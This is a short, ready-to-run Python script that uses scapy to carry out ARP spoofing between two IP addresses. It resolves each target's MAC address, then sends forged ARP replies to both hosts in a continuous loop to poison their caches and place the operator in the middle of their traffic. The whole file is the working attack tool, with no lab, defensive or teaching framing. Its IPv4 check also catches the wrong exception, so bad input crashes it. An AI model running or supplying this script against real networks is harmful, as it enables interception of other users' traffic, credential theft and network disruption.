#!/usr/bin/python

import sys, argparse, socket, time
import scapy.all as scapy

def valid_ip4(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except AttributeError:
        return False

def get_dst_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_req
    try:
        response = scapy.srp(packet, timeout=5, verbose=False)[0]
        mac = response[0][1].hwsrc
    except:
        print("Could not receive a proper response to the ARP packet.")
        return False
    return mac

def spoof_arp(dst, src):
    mac = get_dst_mac(dst)
    if mac != False:
        packet = scapy.ARP(op=2, hwdst=mac, pdst=dst, psrc=src)
        scapy.send(packet, verbose=False)
        return True
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--src", help="The source IP you want to spoof.", type=str, required=True)
    parser.add_argument("--dst", help="The target IP you want to spoof.", type=str, required=True)
    parser.add_argument("--sleep", help="Sleep intervals between each packet. Default is 1 second.", type=int, required=False)

    args = parser.parse_args()

    src = args.src
    dst = args.dst

    sleep = 1
    if args.sleep != None:
        sleep = args.sleep

    if not valid_ip4(src) or not valid_ip4(dst):
        print("Invalid IP address.")
        sys.exit(2)
    
    max_err = 100
    print("Spoofing...")
    try:
        while True:
            if not spoof_arp(dst, src):
                max_err -= 1
            if not spoof_arp(src, dst):
                max_err -= 1
            if max_err <= 0:
                print("Maximum errors reached. Stopping...")
                break
            time.sleep(sleep)
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)